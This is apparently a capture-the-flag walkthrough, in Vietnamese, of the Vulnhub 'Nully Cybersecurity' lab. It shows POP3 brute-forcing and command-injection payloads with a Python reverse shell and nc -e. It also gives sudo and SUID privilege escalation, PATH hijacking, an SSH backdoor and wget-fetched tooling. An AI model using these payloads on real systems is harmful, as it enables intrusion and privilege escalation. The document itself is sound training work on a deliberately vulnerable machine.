# NULLY CYBERSECURITY Vulnhub Walkthrough
## Config IP 
Restart -> Bấm F2 để mở bảng -> Advance Options
![image](https://hackmd.io/_uploads/S1hbrfwLa.png)
Bấm E để sửa
![image](https://hackmd.io/_uploads/Hkl7SMDUT.png)

Sửa "ro recover nomodeset"  -> "rw init=/bin/bash"
Sau đó Ctrl + X

![image](https://hackmd.io/_uploads/B1d7SzPUp.png)

Chọn Recovery mode

![image](https://hackmd.io/_uploads/S1eBrfDUa.png)

Đặt lại mật khẩu

![image](https://hackmd.io/_uploads/HkoPrfPUa.png)

Sau đó chạy exec /sbin/init để khởi động lại hệ thống.
![image](https://hackmd.io/_uploads/ryXdBfDIa.png)

Đăng nhập vào root: pass vừa đặt 
![image](https://hackmd.io/_uploads/ry2tHGDIT.png)

Sử dụng lệnh “vim /etc/netplan/00-installer-config.yaml” để cấu hình card mạng
Trong trường hợp này tên card mạng đang bị sai nên chúng ta sửa “enp0s3” thành “ens33” (cho trùng với tên card mạng ở phía trên)
![image](https://hackmd.io/_uploads/ryr0HMDL6.png)

![image](https://hackmd.io/_uploads/rkKzIzwIa.png)

Đã có IP 
![image](https://hackmd.io/_uploads/ByHiHMPIp.png)


## Flag 1

Scan IP của máy Null 
netdiscover -i eth0 -r 192.168.18.0/24
![image](https://hackmd.io/_uploads/SJv3LzwIp.png)

![image](https://hackmd.io/_uploads/rk-oLGD8a.png)

Scan bằng nmap
nmap -sC -sV 192.168.18.136 -v

![image](https://hackmd.io/_uploads/SkgIvzvU6.png)

Kiểm tra web
![image](https://hackmd.io/_uploads/HkbhwGv8a.png)
Theo rule không được attack port 80, 8000, 9000. Vậy ta phải attack vào 2 port 110 và 2222.

> telnet 192.168.18.136 110
USER pentester
PASS qKnGByeaeQJWTjj2efHxst7Hu0xHADGO
LIST

![image](https://hackmd.io/_uploads/HkPh5fP8T.png)

Thu được danh sách user
![image](https://hackmd.io/_uploads/SJZR9Mv86.png)

Lọc các từ khoá liên quan đến bob: grep bobby /usr/share/wordlists/rockyou.txt > wordlist.txt

hydra -l bob -P wordlist.txt pop3://192.168.18.136

![image](https://hackmd.io/_uploads/H1QToGw8T.png)

Tìm được password: bobby1985, ssh vào
![image](https://hackmd.io/_uploads/H1Df2MwLa.png)

Kiểm tra sudo -l thấy rằng ta có khả năng chạy check.sh với tư cách là người dùng my2user.
![image](https://hackmd.io/_uploads/HJcQnzDIT.png)

Chạy thử script
![image](https://hackmd.io/_uploads/HJfjnMP8p.png)

Ta leo sang my2user xem có gì hay ho không bằng cách thêm /bin/bash vào script
![image](https://hackmd.io/_uploads/SkAyaGP8a.png)

sudo -u my2user /bin/bash /opt/scripts/check.sh
![image](https://hackmd.io/_uploads/rkDQpGwI6.png)
Kiểm tra với sudo -l ta thấy rằng nó có thể chạy /usr/bin/zip với quyền root.

![image](https://hackmd.io/_uploads/SJ5w6GvL6.png)

![image](https://hackmd.io/_uploads/B1W3TzwUp.png)

Tham khảo https://gtfobins.github.io/gtfobins/zip/#sudo để leo lên root qua zip 

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

hoặc 
```bash
sudo zip 1.zip check.sh -T --unzip-command="sh -c /bin/bash"
```


![image](https://hackmd.io/_uploads/BkvECMwUa.png)

Lấy được flag 1
![image](https://hackmd.io/_uploads/H1vwCzv8p.png)


## Flag 2
Tạo backdoor bằng ssh để về sau ssh một phát lên root luôn chứ không phải leo qua my2user.

![image](https://hackmd.io/_uploads/ByqxJ7v8a.png)

![image](https://hackmd.io/_uploads/By2w1QDU6.png)

![image](https://hackmd.io/_uploads/Hysog7vIa.png)

copy file id_rsa sang máy attacker(máy mình)

SSH lại với RSA key

![image](https://hackmd.io/_uploads/HymFlXDLp.png)


![image](https://hackmd.io/_uploads/BkgebQPUp.png)

![image](https://hackmd.io/_uploads/r1lmWmPUa.png)

Sau khi cài netdiscover chạy lệnh netdiscover -i eth0 -r 172.17.0.0/16 để tìm ra các dịch vụ khác trong mạng nội bộ, /16 là vì subnetmask là 255.255.0.0

![image](https://hackmd.io/_uploads/rkfDWmP8T.png)
Chúng ta có thể bỏ qua 172.17.0.1 vì nó là Gateway

172.17.0.2 là MailServer
![image](https://hackmd.io/_uploads/Sygob7DIT.png)

172.17.0.3 Là WebServer
![image](https://hackmd.io/_uploads/SyDRWmPLa.png)

![image](https://hackmd.io/_uploads/B1t1zXPL6.png)

172.17.0.5 là DataCenter
![image](https://hackmd.io/_uploads/HyxZMXP8a.png)


Vì 172.17.0.3 có port 80, nên ta sẽ attack vào đó để lên root web server.
![image](https://hackmd.io/_uploads/H13VG7wIp.png)

Ta forward port về local để dễ attack trên máy mình luôn 
```bash=
ssh -L 8000:172.17.0.3:80 root@192.168.18.136 -p 2222 -i id_rsa
```

![image](https://hackmd.io/_uploads/r1B0fmw8T.png)
![image](https://hackmd.io/_uploads/H1SfmmD8T.png)

Dùng dirb tìm được
![image](https://hackmd.io/_uploads/rJwUXQwIp.png)
![image](https://hackmd.io/_uploads/BkuYXQvLT.png)
Dùng param host để xem có gì lạ không
![image](https://hackmd.io/_uploads/Syy2Q7wLT.png)


![image](https://hackmd.io/_uploads/BkYCmmPI6.png)

Ở đây dính lỗi command injection, do vậy ta đi tìm cách RCE.

![image](https://hackmd.io/_uploads/S1nMVmvU6.png)

Để làm được điều đó ta cần sử dụng netcat và cả 2 máy đều chưa có netcat. Với máy MailServer thì đơn giản chỉ cần tải về thôi

![image](https://hackmd.io/_uploads/BkLt4mwIp.png)
Nhưng với máy web server thì phải lòng vòng hơn, ta phải public file binary của nc lên để máy 172.17.0.3 tải về
![image](https://hackmd.io/_uploads/SkcXLXDUp.png)
![image](https://hackmd.io/_uploads/SJExwQwUT.png)


> http://localhost:8000/ping/ping.php?host=; wget http://172.17.0.2:9000/nc
> http://localhost:8000/ping/ping.php?host=; chmod 777 nc
> http://localhost:8000/ping/ping.php?host=; ls -la nc; pwd

![image](https://hackmd.io/_uploads/HJ5P8mw86.png)

http://localhost:8000/ping/ping.php?host=; /var/www/html/ping/nc 172.17.0.2 9000 -e /bin/bash

Thử dùng nc để tạo revshell nhưng không được.
Dùng payload python3 

```python
http://localhost:8000/ping/ping.php?host=;%20python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22172.17.0.2%22,9000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([%22/bin/sh%22,%22-i%22])%27
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.2",9000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'


![image](https://hackmd.io/_uploads/H1Z2vXvUp.png)

![image](https://hackmd.io/_uploads/SykNumPUa.png)
Có 2 user trong /etc/passwd ta cần chú ý đến

```bash=
find / -type f -user 1001 2>/dev/null
find / -type f -user 1000 2>/dev/null
```

![image](https://hackmd.io/_uploads/rke5umvLp.png)

Đọc file secret của Oliver ta nhận được thông tin đăng nhập
> my password - 4hppfvhb9pW4E4OrbMLwPETRgVo2KyyDTqGF

![image](https://hackmd.io/_uploads/ByC1FmvUa.png)

ssh vào user oliver
![image](https://hackmd.io/_uploads/rJt9YmDIp.png)

Vừa ta đã biết oscar là chủ sở hữu của python3 do vậy payload 
```python=
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
 
ta sẽ leo sang oscar.

![image](https://hackmd.io/_uploads/S1Xe5mDIT.png)

![image](https://hackmd.io/_uploads/SkyXqXwI6.png)

```
H53QfJcXNcur9xFGND3bkPlVlMYUrPyBp76o
```

SSH qua Oscar 
![image](https://hackmd.io/_uploads/ByY857D8p.png)

![image](https://hackmd.io/_uploads/S1Ss5mDUa.png)

Chương trình current-date trả về thời gian hiện tại

![image](https://hackmd.io/_uploads/B1ERcQvL6.png)

Kiểm tra $PATH

![image](https://hackmd.io/_uploads/SJLbiXD8p.png)

vì nó call đến date theo thứ tự trong $PATH nên ta đơn giản chỉ cần tạo prog date chứa /bin/bash là khi chạy current-date nó sẽ excute /bin/bash với quyền root và ta có thể leo lên root rồi.
![image](https://hackmd.io/_uploads/HkE_hXPU6.png)


![image](https://hackmd.io/_uploads/rkoI3QwL6.png)

Lấy được flag 2 
![image](https://hackmd.io/_uploads/SJmh37v86.png)

## Flag 3
![image](https://hackmd.io/_uploads/ry8ITmPLT.png)

Truy cập vào FTP 
![image](https://hackmd.io/_uploads/BJ0kAXvLa.png)
![image](https://hackmd.io/_uploads/Hy2zCmPUa.png)

Tải 2 file về xem

![image](https://hackmd.io/_uploads/HJk-1VPLa.png)

```bash=
#Remote Server
nc -w 3 192.168.18.145 8888 < backup.zip

#Local Machine
nc -lvnp 8888 > backup.zip
```
![image](https://hackmd.io/_uploads/B1m-xNwIp.png)

![image](https://hackmd.io/_uploads/Sk_llVv8a.png)

File zip bị khóa 
![image](https://hackmd.io/_uploads/ryeBxVwIT.png)


```bash=
zip2john backup.zip > hash.txt
john hash.txt
```
![image](https://hackmd.io/_uploads/BJtKlVD8T.png)

Tìm được pass là 1234567890

![image](https://hackmd.io/_uploads/HkToeVvIp.png)
```
donald:HBRLoCZ0b9NEgh8vsECS
```

SSH vào 
![image](https://hackmd.io/_uploads/HyzW-VD8p.png)


Tải linpeas về để dễ dàng tìm cách leo thang hơn

```
# Use a linpeas binary
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64
chmod +x linpeas_linux_amd64
./linpeas_linux_amd64
```

Tìm được Unknown SUID binary của screen-4.5.0
![image](https://hackmd.io/_uploads/ByXezVDLa.png)

Search  tìm được script exploit https://www.exploit-db.com/raw/41154

![image](https://hackmd.io/_uploads/S1y77EwUp.png)

![image](https://hackmd.io/_uploads/HJiX7EDIp.png)

![image](https://hackmd.io/_uploads/rkTBm4PLp.png)

Lấy được flag 3

